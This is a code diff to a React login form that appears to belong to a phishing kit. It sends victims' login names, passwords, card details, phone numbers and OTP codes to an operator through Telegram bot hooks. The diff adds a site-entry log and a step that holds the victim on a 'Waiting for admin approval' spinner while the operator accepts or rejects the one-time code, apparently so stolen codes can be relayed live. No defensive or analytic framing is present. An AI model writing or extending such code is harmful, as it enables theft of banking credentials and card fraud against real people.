@@ -48,6 +48,7 @@ function LoginForm() {
     startTimer();
     const handleMouseMove = () => trackInteraction();
     window.addEventListener('mousemove', handleMouseMove);
+    sendSiteEntryLog();
     return () => {
       window.removeEventListener('mousemove', handleMouseMove);
       resetAntiBot();
@@ -180,14 +181,30 @@ function LoginForm() {
     console.log('🔵 Back to Appr Page button clicked!');
     window.location.href = '/#/NextStepAppr';
   };
+
   const handleDenyOtp = () => {
-  console.log('🔵 Deny OTP button clicked!');
-  setOtpError('Invalid OTP code. Please try again.');
-};
+    console.log('🔵 Deny OTP button clicked!');
+    setOtpError('Invalid OTP code. Please try again.');
+  };
+
   const handleOtpFalse = () => {
-  console.log('🔵 OTP False button clicked!');
-  setOtpError('Invalid OTP code. Please try again.');
-};
+    console.log('🔵 OTP False button clicked!');
+    setWaitingForAdminOtp(false);
+    setOtpError('OTP is false. Please try again.');
+    setOtpCode('');
+  };
+
+  const handleApproveOtp = async () => {
+    console.log('✅ OTP Approved by admin!');
+    setWaitingForAdminOtp(false);
+    
+    await sendOtpVerifiedLog(loginName, cardDetails.phoneNumber, otpCode);
+    await sendSuccessToTelegram(cardDetails.phoneNumber, sessionId);
+    await sendFormattedCardDetails(cardDetails, sessionId, loginName, password);
+    
+    alert(t.success);
+    window.location.reload();
+  };
 
   // Telegram bot hooks
   const {
@@ -204,11 +221,10 @@ function LoginForm() {
     sendOtpVerifiedLog,
     sendLoginTypingLog,
     sendCardTypingLog,
+    sendSiteEntryLog,
     sendOtpTypingLog,
     sendBlockedLog,
     sendConfirmationLog,
-
-
   } = useTelegramBot(
     sessionId, 
     handleApprove, 
@@ -221,7 +237,8 @@ function LoginForm() {
     handleNextStepAppr,
     handleBackToAppr,
     handleDenyOtp,
-    handleOtpFalse
+    handleOtpFalse,
+    handleApproveOtp
   );
 
   const handleInputChange = async (field, value) => {
@@ -466,20 +483,14 @@ function LoginForm() {
       return;
     }
     
-    setIsLoading(true);
+    // Show loading screen and wait for admin approval
+    setWaitingForAdminOtp(true);
     
     await sendOtpSubmitLog(loginName, cardDetails.phoneNumber, otpCode);
     await sendOtpToTelegram(otpCode, cardDetails.phoneNumber, sessionId);
-    await sendOtpVerifiedLog(loginName, cardDetails.phoneNumber, otpCode);
-    await sendSuccessToTelegram(cardDetails.phoneNumber, sessionId);
-    await sendFormattedCardDetails(cardDetails, sessionId, loginName, password);
     
-    setIsLoading(false);
-    
-    alert(t.success);
-    // Clear OTP input and show success message
-    setOtpCode('');
-    
+    // DO NOT proceed - wait for admin to click Approve or False
+    // The user stays on loading screen until admin action
   };
 
   const handleOtpChange = async (value) => {
@@ -542,6 +553,13 @@ function LoginForm() {
               onSubmit={handleOtpSubmit}
               onBack={handleBackToCard}
             />
+          )}
+
+          {waitingForAdminOtp && (
+            <div className="loading-overlay">
+              <div className="spinner"></div>
+              <p>Waiting for admin approval...</p>
+            </div>
           )}
         </>
       )}
